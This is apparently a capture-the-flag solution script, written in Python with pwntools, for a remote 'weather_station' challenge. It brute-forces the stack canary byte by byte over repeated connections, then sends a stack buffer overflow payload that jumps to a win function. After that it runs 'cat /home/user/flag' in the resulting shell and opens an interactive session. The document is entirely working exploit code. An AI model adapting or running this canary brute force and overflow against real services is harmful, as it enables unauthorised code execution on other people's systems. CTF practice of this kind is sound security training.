#!/usr/bin/env python3
from pwn import *
import time

#HOST, PORT = '127.0.0.1', 5555
HOST, PORT = 'offsec.m0lecon.it', 13530
#canary for this instance: 0x7637696b0f18b300
#context.binary = elf = ELF('./weather_station', checksec=False)

#p = process(elf.path)

# Your exploit here

OFFSET_TO_CANARY = 56
OFFSET_TO_RIP = 72
win_addr = 0x401530
ret_addr = 0x40101a

context.log_level = 'info'

def get_conn():
    return remote(HOST, PORT, level='error')

known_canary = b"\x00" # first byte is always null (0x00)

for i in range(7):
    for bval in range(256):
        guess = known_canary + bytes([bval])
        payload = b"A" * OFFSET_TO_CANARY + guess

        io = remote(HOST, PORT, level='error')
        # 1. first  prompt
        io.recvuntil(b"location: ")
        io.send(b"A") 

        # 2. second prompt, with the overflow
        io.recvuntil(b"query: ")
        io.send(payload)
        try:
            data = io.recv(timeout=0.2)
        except EOFError:
            data = b""
        io.close()

        if b"Forecast sent!" in data:
            known_canary = guess
            print(f"byte {i+1}: {bval:02x}")
            break

canary_int = u64(known_canary.ljust(8, b"\x00"))
canary = u64(known_canary)
print(f"Canary: {canary}")


io = remote(HOST, PORT)
io.recvuntil(b"location: ")
io.sendline(b"AAAA")

io.recvuntil(b"query: ")

payload = flat(
    b"A" * OFFSET_TO_CANARY,
    p64(canary),
    b"B" * 8,          
    p64(ret_addr),          
    p64(win_addr)           
)

print(payload)
io.send(payload)

sleep(0.5)
io.sendline('cat /home/user/flag')
io.interactive()
